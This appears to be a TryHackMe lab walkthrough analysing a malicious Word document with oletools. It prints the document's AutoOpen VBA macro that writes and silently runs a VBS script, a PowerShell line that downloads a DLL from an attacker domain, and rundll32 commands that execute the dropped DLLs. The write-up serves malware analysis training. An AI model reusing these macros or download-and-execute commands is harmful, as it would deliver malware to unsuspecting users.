# Try Hack Me - Squid Game, attacker 2

This is part 2 of a [5-part series of walkthroughs](../squid-game.md) for Try Hack Me's Squid Game room.

## 1. Identifying macros - oleid, olevba, oledump

*Q1 Provide the streams (numbers) that contain macros.*  
*Q2 Provide the size (bytes) of the compiled code for the second stream that contains a macro.*  
*Q3 Provide the largest number of bytes found while analyzing the streams.*  
*Q12 Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).*  

Following on from attacker 1, we can assume that we have the same situation - a .doc maldoc containing malicious VBA macros. Running [Oleid](https://github.com/decalage2/oletools/blob/master/oletools/doc/oleid.md) on the sample confirms the presence of VBA macros, and reports a number of features that indicate that they may be malicious : 

```console
remnux@remnux:~$ oleid attacker2.doc
...snip...
Filename: attacker2.doc
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
...snip...
```

[Olevba](https://github.com/decalage2/oletools/wiki/olevba) gives more information on the potentially malicious activities taken by the discovered macros, including AutoOpen (a macro that runs automatiicaly when the document is opened), file system events, and calls to Shell and wscript.shell :

```console
remnux@remnux:~$ olevba attacker2.doc
...snip...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
...snip...
```

With [Oledump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py), we can identify which of the document's streams contain macros : 

```console
remnux@remnux:~$ oledump.py attacker2.doc 
...snip...
  9:      2220 'Macros/Form/o'
 10:       566 'Macros/PROJECT'
 11:        92 'Macros/PROJECTwm'
 12: M    6655 'Macros/VBA/Form'
 13: M   15671 'Macros/VBA/Module1'
 14: M    1593 'Macros/VBA/ThisDocument'
 15:     42465 'Macros/VBA/_VBA_PROJECT'
 16: M    2724 'Macros/VBA/bxh'
...snip...
```

If you're attempting the task questions, try the above command with the "-i" flag for full information on the size of each stream.

## 2. Initial macro analysis - oledump, olevba

*Q4 Find the command located in the ‘fun’ field.*  

Oledump also allows us to to export the discovered macros with the "-s" flag. Starting with streams 12 and 13, we find a pair of long, apparently legitimate functions for validating email addresses and working with mp3 files. These may have been included to reassure analysts that the macro's in the file have a legitimate function. Continuing to stream 14, we find the apparent entry point with the AutoOpen() subprocedure, which in turn makes a call to bxh.eFile : 

```console
remnux@remnux:~$ oledump.py -s 14 -v attacker2.doc
Sub AutoOpen()
    bxh.eFile
End Sub
```

We then find bxh.eFile in stream 16 :

```vb
Attribute VB_Name = "bxh"
Sub eFile()
    Dim QQ1 As Object
    Set QQ1 = New Form
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.t2.Caption
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
    End
End Sub
```

The code here is lightly obfuscated, but can be deobfuscated easily enough manually (this refactor won't necessarily run, but does a good job in showing what the code is actually doing) :

```vb
Sub eFile()
    Dim formHandle As Object
    Set formHandle = New Form
    directory = "C:\ProgramData\"
    fileLocation = directory + "pin.vbs"
    formCaption = formHandle.t2.Caption
    MyFile = FreeFile
    Open fileLocation For Output As #MyFile
    Print #MyFile, formCaption
    Close #MyFile
    fun = Shell("cmd /k cscript.exe C:\ProgramData\pin.vbs", 0)
    End
End Sub
```

The basic strategy here is similar to that seen in attacker1's use of the AlternativeText property of a document object. In this case, the macro extracts the Caption text from a form "t2" included in the document and writes this text to a file `C:\ProgramData\pin.vbs`. The macro then makes a call to [Shell](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function) (a built-in function that can run an executable from a VBA script), using cmd.exe to call cscript.exe to run the Visual Basic script written to `C:\ProgramData\pin.vbs` (the "0" at the end of this call tells Shell not to spawn a terminal window when launching cmd.exe, reducing the likelihood of immediate detection).

So the obvious question - what is the text in the caption? Olevba and oledump can help us out here. Running olevba reveals the additional VBA code in the "Macros/Form/o" stream :

```console
remnux@remnux:~$ olevba attacker2.doc
...snip...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'attacker2.doc' - OLE stream: 'Macros/Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dim WAITPLZ, WS
WAITPLZ = DateAdd(Chr(115), 4, Now())
Do Until (Now() > WAITPLZ)
Loop
...snip...
```

The result is 39 lines of lightly obfuscated Visual Basic. We will go through this code step-by-step to have a better idea of what the malware is doing, but I've also [included it in full for reference](./attacker2.vbs).

## 3. Code analysis

*Q5 Provide the first domain found in the maldoc.*  
*Q6 Provide the second domain found in the maldoc.*  
*Q7 Provide the name of the first malicious DLL it retrieves from the C2 server.*  
*Q8 How many DLLs does the maldoc retrieve from the domains?*  
*Q9 Provide the path of where the malicious DLLs are getting dropped onto?*  
*Q10 What program is it using to run DLLs?*  
*Q11 How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?*  

(The code snippets quoted here are cleaned up and deobfuscated for clarity - see the full version for the original code.)

The code starts by waiting for 4 seconds, but it isn't immediately clear why - the code isn't waiting for any actions to complete during this time :

```vb
WAITPLZ = DateAdd('s', 4, Now())
Do Until (Now() > WAITPLZ)
Loop
```

It then defines 5 obfuscated powershell commands "LL1" through "LL5". Once cleaned up, we see that these commands use the [WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) object to download a .dll from an attacker-controlled domain and save it to "C:\ProgramData\" :

```ps1
$FOOX = '(New-Object Net.WebClient).DownloadFile(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';
IEX $FOOX | IEX;
```

The code then creates a 2. Creates a new [WScript.Shell](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function)
 object that it uses to execute each of the 5 obfuscated commands in powershell (the "0" at the end of the call to Shell.Run tells WScript to hide the terminal window when executing the command) : 

```vb
Set Shell = CreateObject("wscript.shell")
Shell.Run "powershell" + LL1, 0
Shell.Run "powershell" + LL2, 0
```

We then reach another waiting period to make sure that the 5 .dll downloads have completed. The script then defines 5 more commands that call cmd.exe, in turn calling [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) to execute the newly download .dll files. It then executes these commands using the existing WScript.Shell instance :

```vb
OK1 = "cmd /c rundll32.exe C:\ProgramData\www1.dll,ldr"
Ran.Run OK1, 0
OK2 = "cmd /c rundll32.exe C:\ProgramData\www2.dll,ldr"
Ran.Run OK2, 0
```

This is as far as the analysis can go without the downloaded .dll files - we've discovered an IOC in the attacker-controlled domain, as well as like likely names and locations of additional samples (the 5 www*.dll files).
